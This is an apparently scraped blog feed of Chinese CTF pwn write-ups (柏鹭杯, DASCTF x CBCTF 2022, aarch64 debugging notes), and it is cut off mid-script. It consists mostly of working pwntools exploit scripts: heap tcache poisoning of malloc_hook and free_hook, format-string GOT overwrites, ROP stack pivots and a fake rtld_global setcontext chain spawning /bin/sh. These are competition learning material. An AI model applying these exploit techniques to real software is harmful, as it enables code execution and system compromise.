class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def menu(n):</span><br><span class="line">    sla(b'&gt; ', str(n))</span><br><span class="line"></span><br><span class="line">def add(idx, size, con):</span><br><span class="line">    menu(1)</span><br><span class="line">    sla(b'&gt; ', str(idx))</span><br><span class="line">    sla(b'&gt; ', str(size))</span><br><span class="line">    sla(b': ', con)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    sla(b'&gt; ', str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    sla(b'&gt; ', str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(i,0xf8,b'youlin')</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">key=u64(io.recv(5).ljust(8, b'\x00'))</span><br><span class="line">heapbase=key&lt;&lt;12</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">show(8)</span><br><span class="line">libcbase=uu64()-0x219ce0</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line">sh = libcbase + next(libc.search(b'/bin/sh'))</span><br><span class="line">set_context = libcbase + libc.sym['setcontext'] + 61</span><br><span class="line">l_next = libcbase + 0x276890</span><br><span class="line">print("l_next:"+hex(l_next))</span><br><span class="line">rtld = libcbase + 0x275040</span><br><span class="line">ret = libcbase + 0x29cd6</span><br><span class="line">pop_rdi = libcbase + 0x2a3e5</span><br><span class="line">environ = libcbase + 0x221200</span><br><span class="line">dbg()</span><br><span class="line"></span><br><span class="line">delete(7)</span><br><span class="line">add(6,0x1f8,b'youlin')</span><br><span class="line">add(0,0xf8,b'youlin')</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)</span><br><span class="line">add(0,0x1f0,b'A'*0xf0+p64(0)+p64(0x101)+p64((rtld)^key))</span><br><span class="line"></span><br><span class="line">add(0,0xf0,b'youlin')</span><br><span class="line">add(0,0xf0,p64(heapbase+0xcb0)+ b'\x04'+ b'\x00'*7)</span><br><span class="line"></span><br><span class="line">fake_rtld_global_addr = heapbase + 0xcb0</span><br><span class="line">fake_rtld_global = p64(0) + p64(l_next) + p64(0) + p64(fake_rtld_global_addr)</span><br><span class="line">fake_rtld_global += p64(set_context) + p64(ret)</span><br><span class="line">fake_rtld_global += p64(sh)</span><br><span class="line">fake_rtld_global += p64(ret)</span><br><span class="line">fake_rtld_global += p64(system)</span><br><span class="line">fake_rtld_global += b'\x00' * 0x80</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + 0x28 + 0x18)</span><br><span class="line">fake_rtld_global += p64(pop_rdi)</span><br><span class="line">fake_rtld_global += b'\x00' * (0x100 - len(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + 0x10 + 0x110) * 3</span><br><span class="line">fake_rtld_global += p64(0x10)</span><br><span class="line"></span><br><span class="line">add(0, 0x18, b'a' * 0x10 + p64(fake_rtld_global_addr + 0x20))</span><br><span class="line">add(1, 0x200, fake_rtld_global)</span><br><span class="line"></span><br><span class="line">payload = b'\x00' * 0xfc</span><br><span class="line">payload += p8(0x8) + b'\x00' * 3</span><br><span class="line">add(2, 0x200, payload)</span><br><span class="line">menu(4)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;柏鹭杯复现&quot;&gt;&lt;a href=&quot;#柏鹭杯复现&quot; class=&quot;headerlink&quot; title=&quot;柏鹭杯复现&quot;&gt;&lt;/a&gt;柏鹭杯复现&lt;/h1&gt;&lt;h2 id=&quot;note1&quot;&gt;&lt;a href=&quot;#note1&quot; class=&quot;headerlink&quot; title=&quot;not</summary>
      
    
    
    
    <category term="cometition" scheme="http://wscyoulin.github.io/categories/cometition/"/>
    
    
  </entry>
  
  <entry>
    <title>aarch64</title>
    <link href="http://wscyoulin.github.io/2022/09/21/aarch64/"/>
    <id>http://wscyoulin.github.io/2022/09/21/aarch64/</id>
    <published>2022-09-21T10:57:38.000Z</published>
    <updated>2022-09-21T11:05:33.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记录aarch64的运行和调试方法"><a href="#记录aarch64的运行和调试方法" class="headerlink" title="记录aarch64的运行和调试方法"></a>记录aarch64的运行和调试方法</h1><h2 id="以d3招新赛的stack为例"><a href="#以d3招新赛的stack为例" class="headerlink" title="以d3招新赛的stack为例"></a>以d3招新赛的stack为例</h2><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></tbody></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>用gdb-multiarch调试确定溢出长度</p><p>先将程序在指定端口跑起来</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></tbody></table></figure><p>gdb-multiarch调试</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./stack</span><br><span class="line"></span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></tbody></table></figure><p>按c继续运行程序，用pwntools生成字符串并输入到qemu运行的程序中</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">cyclic(100)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://tuchuangs.com/imgs/2022/09/21/38f62e643cc3c89e.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;记录aarch64的运行和调试方法&quot;&gt;&lt;a href=&quot;#记录aarch64的运行和调试方法&quot; class=&quot;headerlink&quot; title=&quot;记录aarch64的运行和调试方法&quot;&gt;&lt;/a&gt;记录aarch64的运行和调试方法&lt;/h1&gt;&lt;h2 id=&quot;以d3招新</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DASCTF_X_CBCTF_2022九月挑战赛</title>
    <link href="http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2022-09-20T08:27:39.000Z</published>
    <updated>2022-10-02T06:23:56.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><p>首先通过溢出覆盖’’\x00’，可以泄露libc.然后是一个格式化字符串漏洞修改puts里面的strlen的libc got</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./cyberprinter"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">onegadget=0xe6aee</span><br><span class="line">ru("Your name?pls..")</span><br><span class="line">sl(b'A'*0x17)</span><br><span class="line">libcbase=uu64()-0x1edc50</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">onegadget=libcbase+onegadget</span><br><span class="line">abs_got=libcbase+0x1eb0a8</span><br><span class="line">payload=fmtstr_payload(8,{abs_got:onegadget})</span><br><span class="line">ru(b"But there is sth wrong in it,so you can't do sth")</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><p>首先是一个检查，结合ida和调试可以发现是Nameless和两个字节的偏移，所以是发送’AANameless’来跳过check</p><p>之后就是一个很明显的栈迁移，但是注意不能离end开头太近，函数栈帧会因为往end里写数据而被破坏导致崩溃，所以可以使用垃圾数据把函数栈帧往下挪，使其远离end开头</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./appetizer"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(14),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru("Let's check your identity")</span><br><span class="line">#sl(b"sselemaN")</span><br><span class="line">s(b'AANameless')</span><br><span class="line">#sl(b'A'*2+p64(0x7373656c656d614e))</span><br><span class="line">io.recvuntil("Here you are:")</span><br><span class="line">gift=iuu64()</span><br><span class="line">print("gift:"+hex(gift))</span><br><span class="line">base=gift-0x4050</span><br><span class="line">leave_ret=0x00000000000012d8+base</span><br><span class="line">pop_rdi=base+0x00000000000014d3</span><br><span class="line">pop_rsi_r15=0x00000000000014d1+base</span><br><span class="line">puts_plt=elf.plt['puts']+base</span><br><span class="line">puts_got=elf.got['puts']+base</span><br><span class="line">read_plt=elf.plt['read']+base</span><br><span class="line">main=0x1428+base</span><br><span class="line"></span><br><span class="line">payload=b'\x00'*0x60+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">ru("And pls write your own information on it")</span><br><span class="line">s(payload)</span><br><span class="line">ru("Tell me your wish:")</span><br><span class="line">payload=p64(gift+0x60-8)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">gdb.attach(io,'b *gift')</span><br><span class="line">libcbase=uu64()-libc.sym['puts']</span><br><span class="line">open_addr=libcbase+libc.sym['open']</span><br><span class="line">pop_rsi = libcbase + 0x27529</span><br><span class="line">pop_rdx_rbx = libcbase + 0x1626d6</span><br><span class="line">write_addr=libcbase+libc.sym['write']</span><br><span class="line">read_addr=libcbase+libc.sym['read']</span><br><span class="line">puts_addr=libcbase+libc.sym['puts']</span><br><span class="line"></span><br><span class="line">orw=b'./flag'.ljust(8,b'\x00')+ b'\x00' * 0x70 + p64(pop_rdi) + p64(gift) + p64(pop_rsi) + p64(0) + p64(open_addr)</span><br><span class="line">orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(gift + 8) + p64(pop_rdx_rbx) + p64(0x30) + p64(0) + p64(read_plt)</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">s(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><h1 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h1><p>一道比较简单的堆题，首先3选项可以直接泄露出libc，而且uaf,堆溢出都有</p><p>首先泄露出libc，接着利用堆溢出构造出unsorted bin，使得堆块重叠，任意修改tcache的fd指针打malloc_hook</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./bar"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(15),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla("Your choice:",str(choice))</span><br><span class="line"></span><br><span class="line">def add(choice,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla("Whisky , brandy or Vodka?",str(choice))</span><br><span class="line">    sla("You may want to tell sth to the waiter:",content)</span><br><span class="line"></span><br><span class="line">def delete(idx, size):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(b'Which?', str(idx))</span><br><span class="line">    sla(b'How much?', str(size))</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">    cmd(3)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">ru("We will give everyone only one cup of icecream!")</span><br><span class="line">libcbase=iuu64()-0x1ec6a0</span><br><span class="line">onegadget=libcbase+0xe6af1</span><br><span class="line">malloc_hook=libcbase+libc.sym['__malloc_hook']</span><br><span class="line">lg=('libcbase')</span><br><span class="line"></span><br><span class="line">add(0,b'youlin')#0</span><br><span class="line">add(0,b'youlin')#1</span><br><span class="line">add(2,b'youlin')#2</span><br><span class="line">add(2,b'youlin')#3</span><br><span class="line">add(2,b'youlin')#4</span><br><span class="line">add(0,b'youlin')#5</span><br><span class="line">add(0,b'youlin')#6</span><br><span class="line">add(0,b'youlin')#7</span><br><span class="line">add(0,b'youlin')#8</span><br><span class="line"></span><br><span class="line">delete(3,0x40)</span><br><span class="line">delete(2,0x40)</span><br><span class="line">delete(0,0x100)</span><br><span class="line">add(0,b'A'*0xf8+p64(0x421))</span><br><span class="line">delete(1,0x100)</span><br><span class="line"></span><br><span class="line">add(1,b'youlin')</span><br><span class="line">add(0,b'A'*0x98+p64(0x51)+p64(malloc_hook-0x10))</span><br><span class="line"></span><br><span class="line">add(2,b'youlin')</span><br><span class="line">add(2,p64(onegadget))</span><br><span class="line"></span><br><span class="line">add(1,b'youlin')</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><h1 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h1><p>整数溢出造成的堆溢出，利用溢出修改出unsorted的size大小，造成堆重叠</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./pwn"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")</span><br><span class="line">ip = 'node4.buuoj.cn'</span><br><span class="line">port = 29013</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla("Your choice:",str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sa("Note size:",str(size))</span><br><span class="line">    sa("Note content:",content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sa("Note ID:",str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sa("Note ID:",str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x80,b'youlin')#0</span><br><span class="line">add(0x80,b'youlin')#1</span><br><span class="line">add(0x200,b'youlin')#2</span><br><span class="line">add(0x200,b'youlin')#3</span><br><span class="line">add(0x80,b'youlin')#4</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">payload=b'A'*0x80+p64(0)+p64(0x4B1)</span><br><span class="line">add(0x100000080,payload)# 整数溢出 0</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x80,b'youlin')#1</span><br><span class="line">show(2)</span><br><span class="line">ru('Note content:')</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b'\x00'))-0x1ebbe0</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line">free_hook=libcbase+libc.sym['__free_hook']</span><br><span class="line"></span><br><span class="line">add(0x400,b'youiln')</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b'A'*0x80+p64(0)+p64(0x211)</span><br><span class="line">add(0x100000080,payload) # 1</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b'A'*0x80+p64(0)+p64(0x211)+p64(free_hook)</span><br><span class="line">add(0x100000080,payload)    # 1</span><br><span class="line"></span><br><span class="line">add(0x200,b'/bin/sh\x00')    # 2</span><br><span class="line">add(0x200,p64(system)) # 3</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure><h2 id="cgrasstring"><a href="#cgrasstring" class="headerlink" title="cgrasstring"></a>cgrasstring</h2><p>c++的pwn(第一次去看)，ida逆出来的代码有点看不懂，只能跟着wp去理解程序逻辑</p><p>大概就是可以通过change造成uaf，通过unsortedbin 泄露出libc,然后打free_hook</p><p>调试的时候和c语言的堆是差不多的（就是我太菜了，ida逆出来的代码有点看不懂）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 